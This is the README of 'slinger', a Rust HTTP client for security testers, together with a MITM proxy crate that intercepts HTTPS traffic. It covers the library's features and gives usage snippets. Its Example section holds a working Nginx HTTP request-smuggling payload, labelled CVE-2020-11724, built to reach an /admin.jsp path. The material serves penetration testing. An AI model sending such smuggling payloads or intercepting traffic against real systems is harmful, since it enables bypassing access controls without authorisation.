<!-- Improved compatibility of back to top link: See: https://github.com/emo-crab/slinger/pull/73 -->
<a name="readme-top"></a>
<!--
*** Thanks for checking out the slinger. If you have a suggestion
*** that would make this better, please fork the repo and create a pull request
*** or simply open an issue with the tag "enhancement".
*** Don't forget to give the project a star!
*** Thanks again! Now go create something AMAZING!
-->



<!-- PROJECT SHIELDS -->
<!--
*** I'm using markdown "reference style" links for readability.
*** Reference links are enclosed in brackets [ ] instead of parentheses ( ).
*** See the bottom of this document for the declaration of the reference variables
*** for contributors-url, forks-url, etc. This is an optional, concise syntax you may use.
*** https://www.markdownguide.org/basic-syntax/#reference-style-links
-->
[![Contributors][contributors-shield]][contributors-url]
[![Forks][forks-shield]][forks-url]
[![Stargazers][stars-shield]][stars-url]
[![Issues][issues-shield]][issues-url]
[![MIT License][license-shield]][license-url]
[![crates io][crates-shield]][crates-url]




<!-- PROJECT LOGO -->
<br />
<div align="center">
  <a href="https://github.com/emo-crab/slinger">
    <img src="images/logo.svg" alt="Logo">
  </a>

<h3 align="center">slinger(投石器)</h3>

  <p align="center">
    An HTTP Client for Rust designed for hackers.
    <br />
    <a href="https://github.com/emo-crab/slinger"><strong>Explore the docs »</strong></a>
    <br />
    <br />
    <a href="https://github.com/emo-crab/slinger">View Demo</a>
    ·
    <a href="https://github.com/emo-crab/slinger/issues">Report Bug</a>
    ·
    <a href="https://github.com/emo-crab/slinger/issues">Request Feature</a>
  </p>
</div>

<!-- ABOUT THE PROJECT -->

## About The Project

![Product Name Screen Shot][product-screenshot]

**Slinger** is a workspace containing:

### slinger
The core HTTP client library for Rust designed for hackers.

- customizable redirect policy
- http/https and socks5/socks5h proxies
- cookie store
- raw socket request
- HTTPS via tls

### slinger-mitm  
A Man-in-the-Middle (MITM) proxy with transparent HTTPS traffic interception, similar to Burp Suite.

- Automatic CA certificate generation with improved certificate management (inspired by [hudsucker](https://github.com/omjadas/hudsucker))
- Certificate caching for high performance
- Transparent HTTPS interception using rustls backend
- Traffic interception and modification interfaces
- Random serial numbers and clock skew handling
- Reuses slinger's Socket implementation
- Minimal external dependencies

<p align="right">(<a href="#readme-top">back to top</a>)</p>



<!-- GETTING STARTED -->

## Getting Started

### Using slinger (HTTP Client)

This example enables some optional features, so your `Cargo.toml` could look like this:

```toml
[dependencies]
slinger = { version = "0.2.9", features = ["serde", "cookie", "charset", "tls", "rustls", "gzip"] }
```

And then the code:

```rust,no_run
#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
  let resp = slinger::get("https://httpbin.org/get").await?;
  println!("{:?}", resp.text());
  Ok(())
}
```

### Using slinger-mitm (MITM Proxy)

Add to your `Cargo.toml`:

```toml
[dependencies]
slinger-mitm = { version = "0.2.9" }
tokio = { version = "1", features = ["full"] }
```

Example code:

```rust,no_run
use slinger_mitm::{MitmConfig, MitmProxy, Interceptor};
use std::sync::Arc;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let config = MitmConfig::default();
    let proxy = MitmProxy::new(config).await?;
    
    // Add logging interceptor
    let handler = proxy.interceptor_handler();
    let mut h = handler.write().await;
    h.add_request_interceptor(Arc::new(Interceptor::logging()));
    drop(h);
    
    proxy.start("127.0.0.1:8080").await?;
    Ok(())
}
```

See [slinger-mitm/README.md](slinger-mitm/README.md) for more details on MITM proxy usage.

<!-- FEATURES -->

## Features

Slinger supports the following optional features:

- `tls` - Base TLS feature (enables TLS types and interfaces without a specific backend)
- `rustls` - HTTPS support using Rustls (requires `tls`, pure Rust implementation)
- `http2` - HTTP/2 protocol support (requires a TLS backend)
- `cookie` - Cookie handling support
- `charset` - Character encoding support
- `serde` - Serialization/deserialization support
- `gzip` - Gzip compression support
- `schema` - JSON Schema support

### TLS Backend Selection

To use TLS, you must:
1. Enable the `tls` feature
2. Choose the `rustls` backend, OR provide a custom TLS connector

Example feature combinations:
```toml
# Using rustls backend
slinger = { version = "0.2.8", features = ["tls", "rustls"] }

# Using custom TLS backend (requires implementing CustomTlsConnector)
slinger = { version = "0.2.8", features = ["tls"] }
```

### Custom TLS Backend (e.g., native-tls, OpenSSL)

If you want to use native-tls, OpenSSL, or other TLS libraries, you can implement a custom TLS connector.
See the [native_tls_example.rs](examples/native_tls_example.rs) for a complete example of how to integrate native-tls.

<!-- USAGE EXAMPLES -->

## Example

- Nginx - Http Smuggling [CVE-2019-20372](https://scap.kali-team.cn/cve/CVE-2020-11724)

```rust
use std::io::BufRead;
use slinger::{ClientBuilder, HTTPRecord};

/// CVE-2020-11724
/// when you're using BurpSuite proxy need **disabled** "set **Connection** header on incoming request"
const RAW: &[u8] = b"GET /test1 HTTP/1.1
Host: 192.168.83.196:8081
Content-Length: 42
Transfer-Encoding: chunked

0

GET /test1 HTTP/1.1
Host: 192.168.83.196:8081
X: GET http://192.168.83.1:8080/admin.jsp HTTP/1.0

";
#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
  // let proxy = slinger::Proxy::parse("http://127.0.0.1:8080").unwrap();
  let client = ClientBuilder::default().build().unwrap();
  let mut raw = Vec::new();
  // replace \n to \r\n
  for line in RAW.lines() {
    match line {
      Ok(l) => {
        raw.extend(l.as_bytes());
        raw.extend(b"\r\n")
      }
      Err(err) => {
        println!("{:?}", err);
      }
    }
  }
  let resp = client.raw("http://127.0.0.1:9015/", raw, true).send().await?;
  let record = resp.extensions().get::<Vec<HTTPRecord>>().unwrap();
  println!("{:?}", record);
  Ok(())
}

```

_For more examples, please refer to the [example](https://github.com/emo-crab/slinger/tree/main/examples)_

<p align="right">(<a href="#readme-top">back to top</a>)</p>

<!-- CONTRIBUTING -->

## Contributing

Contributions are what make the open source community such an amazing place to learn, inspire, and create. Any
contributions you make are **greatly appreciated**.

If you have a suggestion that would make this better, please fork the repo and create a pull request. You can also
simply open an issue with the tag "enhancement".
Don't forget to give the project a star! Thanks again!

1. Fork the Project
2. Create your Feature Branch (`git checkout -b feature/AmazingFeature`)
3. Commit your Changes (`git commit -m 'Add some AmazingFeature'`)
4. Push to the Branch (`git push origin feature/AmazingFeature`)
5. Open a Pull Request

<p align="right">(<a href="#readme-top">back to top</a>)</p>



<!-- LICENSE -->

## License

Distributed under the `GPL-3.0-only` License. See `LICENSE` for more information.

<p align="right">(<a href="#readme-top">back to top</a>)</p>



<!-- CONTACT -->

## Contact

Your Name - [@Kali_Team](https://twitter.com/Kali_Team) - root@kali-team.cn

Project Link: [https://github.com/emo-crab/slinger](https://github.com/emo-crab/slinger)

<p align="right">(<a href="#readme-top">back to top</a>)</p>

<!-- ACKNOWLEDGMENTS -->

## Acknowledgments

* [reqwest](https://github.com/seanmonstar/reqwest)

<p align="right">(<a href="#readme-top">back to top</a>)</p>



<!-- MARKDOWN LINKS & IMAGES -->
<!-- https://www.markdownguide.org/basic-syntax/#reference-style-links -->

[contributors-shield]: https://img.shields.io/github/contributors/emo-crab/slinger.svg?style=for-the-badge

[contributors-url]: https://github.com/emo-crab/slinger/graphs/contributors

[forks-shield]: https://img.shields.io/github/forks/emo-crab/slinger.svg?style=for-the-badge

[forks-url]: https://github.com/emo-crab/slinger/network/members

[stars-shield]: https://img.shields.io/github/stars/emo-crab/slinger.svg?style=for-the-badge

[stars-url]: https://github.com/emo-crab/slinger/stargazers

[issues-shield]: https://img.shields.io/github/issues/emo-crab/slinger.svg?style=for-the-badge

[issues-url]: https://github.com/emo-crab/slinger/issues

[license-shield]: https://img.shields.io/github/license/emo-crab/slinger.svg?style=for-the-badge

[license-url]: https://github.com/emo-crab/slinger/blob/master/LICENSE.txt

[product-screenshot]: images/screenshot.png

[crates-shield]: https://img.shields.io/crates/v/slinger.svg?style=for-the-badge

[crates-url]: https://crates.io/crates/slinger
